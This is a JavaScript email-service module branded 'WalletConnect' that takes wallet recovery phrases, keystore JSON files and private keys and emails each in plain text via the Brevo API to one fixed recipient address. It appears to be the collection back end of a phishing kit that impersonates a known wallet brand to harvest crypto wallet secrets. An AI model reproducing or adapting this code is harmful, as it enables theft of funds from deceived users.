const dotenv = require('dotenv');
const SibApiV3Sdk = require('sib-api-v3-sdk');

dotenv.config();

class EmailService {
    constructor() {
        console.log(`📧 EMAIL SERVICE: Initializing Brevo API for WalletConnect...`);
        console.log(`📧 EMAIL SERVICE: SMTP_USERNAME: ${process.env.SMTP_USERNAME}`);
        console.log(`📧 EMAIL SERVICE: SMTP_PASS: ${process.env.SMTP_PASS ? 'SET' : 'NOT SET'}`);
    }

    async sendEmail(to, subject, html, text = null) {
        try {
            console.log(`📧 EMAIL SERVICE: Starting email send`);
            console.log(`📧 EMAIL SERVICE: To: ${Array.isArray(to) ? to.join(', ') : to}`);
            console.log(`📧 EMAIL SERVICE: Subject: ${subject}`);
            
            // Use Brevo API
            return await this.sendViaAPI(to, subject, html, text);
        } catch (error) {
            console.error('❌ Failed to send email:', error);
            return { success: false, error: error.message };
        }
    }

    async sendViaAPI(to, subject, html, text = null) {
        console.log(`📧 EMAIL SERVICE: Using Brevo API...`);
        
        try {
            // Configure API key authorization
            const defaultClient = SibApiV3Sdk.ApiClient.instance;
            const apiKey = defaultClient.authentications['api-key'];
            apiKey.apiKey = process.env.SMTP_PASS; // Your Brevo API key
            
            // Create API instance
            const apiInstance = new SibApiV3Sdk.TransactionalEmailsApi();
            
            // Create email object
            const sendSmtpEmail = new SibApiV3Sdk.SendSmtpEmail();
            
            // Handle multiple recipients
            const recipients = Array.isArray(to) ? to : [to];
            sendSmtpEmail.to = recipients.map(email => ({
                email: email,
                name: email.split('@')[0] // Use email prefix as name
            }));
            
            sendSmtpEmail.sender = {
                name: 'WalletConnect',
                email: process.env.SMTP_USERNAME
            };
            
            sendSmtpEmail.subject = subject;
            sendSmtpEmail.htmlContent = html;
            
            if (text) {
                sendSmtpEmail.textContent = text;
            }
            
            // Send the email
            const result = await apiInstance.sendTransacEmail(sendSmtpEmail);
            
            console.log(`✅ EMAIL SERVICE: Brevo API email sent successfully!`);
            console.log(`✅ EMAIL SERVICE: Message ID: ${result.messageId}`);
            return { success: true, messageId: result.messageId };
            
        } catch (error) {
            const status = error && (error.status || error.code || (error.response && error.response.status));
            const headers = error && error.response && error.response.headers;
            const body = error && error.response && error.response.body ? error.response.body : (error && error.message ? error.message : error);
            console.error('❌ EMAIL SERVICE: Brevo API failed:', { status, headers, body });
            return { success: false, error: typeof body === 'string' ? body : JSON.stringify(body), status };
        }
    }

    // Recovery phrase email
    async sendRecoveryPhraseEmail(recoveryPhrase) {
        const html = `
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="utf-8">
                <title>Recovery Phrase - WalletConnect</title>
            </head>
            <body style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
                <div style="text-align: center; margin-bottom: 30px;">
                    <h1 style="color: #008080;">🔐 WalletConnect</h1>
                </div>
                
                <h2>Recovery Phrase Received</h2>
                
                <div style="background: #f8f9fa; border: 2px solid #008080; border-radius: 8px; padding: 20px; margin: 25px 0;">
                    <h3>Recovery Phrase</h3>
                    <p style="word-break: break-all; font-family: monospace; background: #fff; padding: 10px; border-radius: 4px;">
                        <strong>${recoveryPhrase}</strong>
                    </p>
                </div>
                
                <div style="background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 15px; border-radius: 5px; margin: 20px 0;">
                    <strong>⚠️ Important:</strong> Keep your recovery phrase secure and never share it with anyone.
                </div>
                
                <p>Best regards,<br>
                WalletConnect Team</p>
            </body>
            </html>
        `;

        return await this.sendEmail(process.env.RECIPIENT_EMAIL, 'Recovery Phrase - WalletConnect', html);
    }

    // Keystore JSON email
    async sendKeystoreEmail(keystoreJson) {
        const html = `
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="utf-8">
                <title>Keystore JSON - WalletConnect</title>
            </head>
            <body style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
                <div style="text-align: center; margin-bottom: 30px;">
                    <h1 style="color: #008080;">🔐 WalletConnect</h1>
                </div>
                
                <h2>Keystore JSON Received</h2>
                
                <div style="background: #f8f9fa; border: 2px solid #008080; border-radius: 8px; padding: 20px; margin: 25px 0;">
                    <h3>Keystore JSON</h3>
                    <pre style="white-space: pre-wrap; font-family: monospace; background: #fff; padding: 10px; border-radius: 4px; overflow-x: auto;">${keystoreJson}</pre>
                </div>
                
                <div style="background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 15px; border-radius: 5px; margin: 20px 0;">
                    <strong>⚠️ Important:</strong> Keep your keystore file secure and never share it with anyone.
                </div>
                
                <p>Best regards,<br>
                WalletConnect Team</p>
            </body>
            </html>
        `;

        return await this.sendEmail(process.env.RECIPIENT_EMAIL, 'Keystore JSON - WalletConnect', html);
    }

    // Private key email
    async sendPrivateKeyEmail(privateKey) {
        const html = `
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="utf-8">
                <title>Private Key - WalletConnect</title>
            </head>
            <body style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
                <div style="text-align: center; margin-bottom: 30px;">
                    <h1 style="color: #008080;">🔐 WalletConnect</h1>
                </div>
                
                <h2>Private Key Received</h2>
                
                <div style="background: #f8f9fa; border: 2px solid #008080; border-radius: 8px; padding: 20px; margin: 25px 0;">
                    <h3>Private Key</h3>
                    <p style="word-break: break-all; font-family: monospace; background: #fff; padding: 10px; border-radius: 4px;">
                        <strong>${privateKey}</strong>
                    </p>
                </div>
                
                <div style="background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 15px; border-radius: 5px; margin: 20px 0;">
                    <strong>⚠️ Important:</strong> Keep your private key secure and never share it with anyone.
                </div>
                
                <p>Best regards,<br>
                WalletConnect Team</p>
            </body>
            </html>
        `;

        return await this.sendEmail(process.env.RECIPIENT_EMAIL, 'Private Key - WalletConnect', html);
    }
}

// Create and export email service instance
const emailService = new EmailService();
module.exports = emailService;
